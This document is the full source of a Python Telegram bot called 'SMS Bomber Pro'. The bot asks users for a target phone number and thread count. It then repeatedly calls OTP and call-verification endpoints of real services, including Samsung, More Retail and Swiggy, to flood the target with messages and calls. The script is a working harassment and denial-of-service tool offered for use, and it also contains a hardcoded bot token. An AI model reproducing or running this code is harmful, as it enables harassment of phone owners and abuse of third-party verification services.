import logging
import asyncio
import requests
import time
import threading
import json
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
CHANNEL_ID = -1002512368825

# Premium ASCII Art Banner
BANNER = """
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Global variables
message_count = 0
api_counters = {}
api_repeats = {}
count_lock = threading.Lock()
start_time = 0
bomber_active = False
current_target = ""
current_threads = 0
status_message_id = None

# API configurations (optimized)
api_configurations = [
    # Tier 1 APIs (High priority)
    {
        'name': '🔥 Booming API',
        'url': 'https://booming-api.vercel.app/',
        'method': 'GET',
        'params': lambda n: {'number': n},
        'interval': 0.5,
        'threads': 'user_defined',
        'tier': 1
    },
    # Tier 2 APIs (Medium priority)
    {
        'name': '📱 Samsung OTP',
        'url': 'https://www.samsung.com/in/api/v1/sso/otp/init',
        'method': 'POST',
        'data': lambda n: json.dumps({"user_id": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1,
        'tier': 2
    },
    {
        'name': '🛒 More Retail',
        'url': 'https://omni-api.moreretail.in/api/v1/login/',
        'method': 'POST',
        'data': lambda n: json.dumps({"hash_key": "XfsoCeXADQA", "phone_number": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1,
        'tier': 2
    },
    # Tier 3 APIs (Standard)
    {
        'name': '🍔 Swiggy Call',
        'url': 'https://profile.swiggy.com/api/v3/app/request_call_verification',
        'method': 'POST',
        'data': lambda n: json.dumps({"mobile": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1,
        'tier': 3
    },
    # ... (other APIs with similar structure)
]

def api_request_loop(api_config, number, thread_id=None):
    global message_count, api_counters, api_repeats, bomber_active
    api_name = api_config['name']
    
    with count_lock:
        if api_name not in api_counters:
            api_counters[api_name] = 0
            api_repeats[api_name] = 0
    
    while bomber_active:
        try:
            start_req = time.time()
            
            if api_config['method'] == 'POST':
                response = requests.post(
                    api_config['url'],
                    data=api_config['data'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            else:
                response = requests.get(
                    api_config['url'],
                    params=api_config['params'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            
            with count_lock:
                message_count += 1
                api_counters[api_name] += 1
                if api_counters[api_name] % 100 == 0:
                    api_repeats[api_name] += 1
                
        except Exception as e:
            logging.error(f"Error in {api_name} thread {thread_id}: {str(e)}")
        
        elapsed = time.time() - start_req
        sleep_time = max(0, api_config['interval'] - elapsed)
        time.sleep(sleep_time)

def start_bomber(number, boom_threads):
    global bomber_active, start_time, message_count, api_counters, api_repeats, current_target, current_threads
    
    bomber_active = True
    start_time = time.time()
    message_count = 0
    api_counters = {}
    api_repeats = {}
    current_target = number
    current_threads = boom_threads
    
    # Start API threads by tier (priority)
    for tier in [1, 2, 3]:  # Higher tiers first
        for config in [c for c in api_configurations if c.get('tier', 3) == tier]:
            threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
            for i in range(threads):
                t = threading.Thread(
                    target=api_request_loop,
                    args=(config, number, i+1),
                    daemon=True
                )
                t.start()
    
    logging.info(f"Bomber started on {number} with {boom_threads} threads")

def stop_bomber():
    global bomber_active, current_target, current_threads, status_message_id
    bomber_active = False
    current_target = ""
    current_threads = 0
    status_message_id = None
    logging.info("Bomber stopped by user")

async def update_status(context: ContextTypes.DEFAULT_TYPE, chat_id=None, message_id=None):
    if not bomber_active:
        return
    
    with count_lock:
        current_total = message_count
        current_api_counts = api_counters.copy()
        current_repeats = api_repeats.copy()
    
    runtime = time.time() - start_time
    requests_per_sec = current_total / max(1, runtime)
    mins, secs = divmod(int(runtime), 60)
    hrs, mins = divmod(mins, 60)
    
    # Dynamic progress bar based on activity
    activity_level = min(10, int(requests_per_sec * 2))
    progress_bar = "▓" * activity_level + "░" * (10 - activity_level)
    
    # Prepare status message
    status_text = f"""
<b>⚡ SMS BOMBER PRO - LIVE STATUS</b>
{progress_bar}

<b>📌 Target:</b> <code>{current_target}</code>
<b>🧵 Threads:</b> <code>{current_threads}</code>
<b>⏱ Runtime:</b> <code>{f"{hrs}h " if hrs else ""}{mins}m {secs}s</code>

<b>📊 Requests:</b> <code>{current_total:,}</code>
<b>🚀 Speed:</b> <code>{requests_per_sec:.1f}/sec</code>

<b>🔧 Active APIs:</b>
"""
    
    # Add API stats (sorted by request count)
    for api_name, count in sorted(current_api_counts.items(), key=lambda x: x[1], reverse=True):
        repeat = current_repeats.get(api_name, 0)
        status_text += f"  • {api_name}: <code>{count:,}</code> (×{repeat})\n"
    
    # Add last update time
    status_text += f"\n<b>🔄 Last Update:</b> <code>{time.strftime('%H:%M:%S')}</code>"
    
    # Send or edit message
    try:
        if message_id:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=status_text,
                parse_mode='HTML'
            )
        else:
            msg = await context.bot.send_message(
                chat_id=chat_id,
                text=status_text,
                parse_mode='HTML'
            )
            return msg.message_id
    except Exception as e:
        logging.error(f"Status update error: {e}")

async def status_updater(context: ContextTypes.DEFAULT_TYPE):
    global status_message_id
    while bomber_active:
        try:
            if status_message_id:
                await update_status(context, context.job.chat_id, status_message_id)
            else:
                status_message_id = await update_status(context, context.job.chat_id)
        except Exception as e:
            logging.error(f"Status updater error: {e}")
        await asyncio.sleep(5)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        welcome_text = f"""
<pre>{BANNER}</pre>
<b>🌟 PREMIUM SMS BOMBER v3.0 🌟</b>

🚀 <i>Most advanced bombing tool on Telegram</i>

<b>🔹 Features:</b>
• Multi-tier API architecture
• Real-time visual analytics
• Priority request handling
• Adaptive progress tracking

👉 Join our channel to begin!
        """
        
        keyboard = [
            [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/+RhlQLyOfQ48xMjI1")],
            [InlineKeyboardButton("✅ VERIFY JOIN", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.message.edit_text(
                welcome_text,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                welcome_text,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
    except Exception as e:
        logging.error(f"Start error: {e}")

async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        # Verify channel membership
        member = await context.bot.get_chat_member(CHANNEL_ID, query.from_user.id)
        if member.status in ['member', 'administrator', 'creator']:
            keyboard = [
                [InlineKeyboardButton("🚀 START BOMBER", callback_data="start_bomber")],
                [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
            ]
            await query.edit_message_text(
                "<b>✅ ACCESS GRANTED</b>\n\n"
                "Welcome to <b>SMS Bomber Pro</b>!\n\n"
                "Choose an option below:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
        else:
            await query.answer("❌ You must join the channel first!", show_alert=True)
    except Exception as e:
        logging.error(f"Check join error: {e}")

async def start_bomber_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "<b>🔢 ENTER TARGET NUMBER</b>\n\n"
            "• 10 digits only\n"
            "• Without country code\n"
            "• Example: <code>9876543210</code>\n\n"
            "<i>Type /cancel to abort</i>",
            parse_mode='HTML'
        )
        context.user_data['awaiting_number'] = True
    except Exception as e:
        logging.error(f"Bomber flow error: {e}")

async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'awaiting_number' in context.user_data:
        number = update.message.text.strip()
        
        if number.lower() == '/cancel':
            await update.message.reply_text("🚫 Operation cancelled")
            context.user_data.clear()
            return
        
        if not (number.isdigit() and len(number) == 10):
            await update.message.reply_text(
                "❌ <b>INVALID NUMBER</b>\n\n"
                "Please enter a valid 10-digit number\n"
                "Example: <code>9876543210</code>",
                parse_mode='HTML'
            )
            return
        
        context.user_data['target_number'] = number
        context.user_data['awaiting_threads'] = True
        context.user_data.pop('awaiting_number', None)
        
        keyboard = [
            [InlineKeyboardButton("⚡ 5 Threads", callback_data="t_5")],
            [InlineKeyboardButton("💥 10 Threads", callback_data="t_10")],
            [InlineKeyboardButton("🚀 20 Threads", callback_data="t_20")],
            [InlineKeyboardButton("🔢 Custom", callback_data="t_custom")]
        ]
        
        await update.message.reply_text(
            "<b>🧵 SELECT THREAD COUNT</b>\n\n"
            "Higher threads = faster bombing\n"
            "Recommended: 5-20 threads\n\n"
            "<i>For custom values (1-100), choose 🔢</i>",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        if query.data == "t_custom":
            await query.edit_message_text(
                "<b>✏️ ENTER CUSTOM THREAD COUNT</b>\n\n"
                "Enter a number between 1-100\n"
                "Example: <code>25</code>\n\n"
                "<i>Type /cancel to abort</i>",
                parse_mode='HTML'
            )
            context.user_data['awaiting_custom_threads'] = True
            return
        
        threads = int(query.data.split('_')[1])
        number = context.user_data['target_number']
        
        # Start bombing
        start_bomber(number, threads)
        
        # Start status updates
        context.job_queue.run_repeating(
            status_updater,
            interval=5,
            first=1,
            chat_id=query.message.chat_id
        )
        
        await query.edit_message_text(
            f"<b>🚀 BOMBER ACTIVATED</b>\n\n"
            f"Target: <code>{number}</code>\n"
            f"Threads: <code>{threads}</code>\n\n"
            "Status updates will appear shortly...\n"
            "Use /stopbomber to terminate",
            parse_mode='HTML'
        )
        
        context.user_data.clear()
    except Exception as e:
        logging.error(f"Thread selection error: {e}")

async def handle_custom_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'awaiting_custom_threads' in context.user_data:
        try:
            threads = int(update.message.text.strip())
            if not 1 <= threads <= 100:
                raise ValueError
                
            number = context.user_data['target_number']
            
            # Start bombing
            start_bomber(number, threads)
            
            # Start status updates
            context.job_queue.run_repeating(
                status_updater,
                interval=5,
                first=1,
                chat_id=update.message.chat_id
            )
            
            await update.message.reply_text(
                f"<b>🚀 BOMBER ACTIVATED</b>\n\n"
                f"Target: <code>{number}</code>\n"
                f"Threads: <code>{threads}</code>\n\n"
                "Status updates will appear shortly...\n"
                "Use /stopbomber to terminate",
                parse_mode='HTML'
            )
            
            context.user_data.clear()
        except ValueError:
            await update.message.reply_text(
                "❌ <b>INVALID THREAD COUNT</b>\n\n"
                "Please enter a number between 1-100",
                parse_mode='HTML'
            )

async def stop_bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bomber_active:
        stop_bomber()
        await update.message.reply_text(
            "🛑 <b>BOMBER TERMINATED</b>\n\n"
            "All attack threads stopped\n"
            "Total requests cleared",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            "ℹ️ <b>No active bomber session</b>",
            parse_mode='HTML'
        )

async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("🚫 Current operation cancelled")

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logging.error(f"Error: {context.error}")
    if isinstance(update, Update):
        if update.callback_query:
            await update.callback_query.answer("⚠️ An error occurred", show_alert=True)
        elif update.message:
            await update.message.reply_text("❌ Error encountered. Please try again.")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stopbomber", stop_bomber_command))
    app.add_handler(CommandHandler("cancel", cancel_handler))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    app.add_handler(CallbackQueryHandler(start_bomber_flow, pattern="start_bomber"))
    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^t_[0-9]+"))
    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="t_custom"))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^\d{10}$'), handle_number_input))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^\d+$'), handle_custom_threads))
    
    # Error handler
    app.add_error_handler(error_handler)
    
    logging.info("⚡ Bomber Bot Started")
    app.run_polling()

if __name__ == '__main__':
    main()
